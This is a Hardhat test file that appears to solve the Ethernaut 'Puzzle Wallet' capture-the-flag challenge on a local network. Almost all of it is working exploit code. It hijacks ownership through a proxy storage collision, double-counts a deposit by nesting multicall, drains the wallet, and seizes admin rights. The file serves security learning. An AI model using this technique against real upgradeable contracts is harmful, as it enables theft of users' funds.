import { TransactionResponse } from "@ethersproject/providers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

const iface = new ethers.utils.Interface([
  "function owner() view returns (address)",
  "function whitelisted(address _whiteListed) view returns (bool)",
  "function addToWhitelist(address addr)",
  "function setMaxBalance(uint256 _maxBalance)",
  "function multicall(bytes[] calldata data) payable",
  "function deposit() payable",
  "function execute(address to,uint256 value,bytes calldata data) payable",
]);
let calldata: string;

let tx: TransactionResponse;
const VALUE = ethers.utils.parseEther("0.001");

describe("Puzzle Wallet Hack", async () => {
  async function deployPuzzleWalletFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const attackerAddress = await attacker.getAddress();
    const PuzzleWalletFactory = await ethers.getContractFactory("PuzzleWalletFactory");
    const factory = await PuzzleWalletFactory.deploy();
    await factory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const puzzleProxyAddress = await factory
      .connect(deployer)
      .callStatic.createInstance(attackerAddress, { value: VALUE });

    // deploy the instance
    tx = await factory.connect(deployer).createInstance(attackerAddress, { value: VALUE });
    await tx.wait(1);

    const proxy = await ethers.getContractAt("PuzzleProxy", puzzleProxyAddress);

    return { proxy, factory, attacker };
  }

  it("Hijack wallet and become the admin of the proxy", async () => {
    const { proxy, factory, attacker } = await loadFixture(deployPuzzleWalletFixture);
    const attackerAddress = await attacker.getAddress();

    // propose attacker as new admin
    // this will set owner variable of PuzzleWallet to attacker address
    tx = await proxy.connect(attacker).proposeNewAdmin(attackerAddress);
    await tx.wait(1);
    expect(await proxy.pendingAdmin()).to.be.equal(attackerAddress, "Failed To Propose New Admin");

    // whitelist attacker address using proxy delegatecall
    calldata = iface.encodeFunctionData("addToWhitelist", [attackerAddress]);
    tx = await attacker.sendTransaction({ to: proxy.address, data: calldata });
    await tx.wait(1);
    expect(
      ethers.utils.defaultAbiCoder.decode(
        ["bool"],
        await attacker.call({
          to: proxy.address,
          data: iface.encodeFunctionData("whitelisted", [attackerAddress]),
        })
      )[0]
    ).to.be.equal(true, "Failed To Whitelist The Address");

    // call multicall passing call data for deposit and multicall
    // inside inner multicall pass call data for execute
    const depositFnCall = iface.encodeFunctionData("deposit");

    const depositCall: string[] = [];
    depositCall[0] = depositFnCall;

    const calls: string[] = [];
    calls[0] = depositFnCall;
    calls[1] = iface.encodeFunctionData("multicall", [depositCall]);

    tx = await attacker.sendTransaction({
      to: proxy.address,
      data: iface.encodeFunctionData("multicall", [calls]),
      value: VALUE,
    });
    await tx.wait(1);

    // call execute to drain the balance
    tx = await attacker.sendTransaction({
      to: proxy.address,
      data: iface.encodeFunctionData("execute", [
        attackerAddress,
        ethers.utils.parseEther("0.002"),
        ethers.utils.formatBytes32String(""),
      ]),
    });
    await tx.wait(1);

    // set maxBalance as your address
    tx = await attacker.sendTransaction({
      to: proxy.address,
      data: iface.encodeFunctionData("setMaxBalance", [attackerAddress]),
    });
    await tx.wait(1);
    expect(
      ethers.utils.defaultAbiCoder.decode(
        ["address"],
        await attacker.call({ to: proxy.address, data: iface.encodeFunctionData("owner") })
      )[0]
    ).to.equal(attackerAddress, "Failed to set attacker as owner");

    const success = await factory.validateInstance(proxy.address, attackerAddress);
    expect(success).to.be.equal(true, "Failed To Validate The Instance");
  });
});
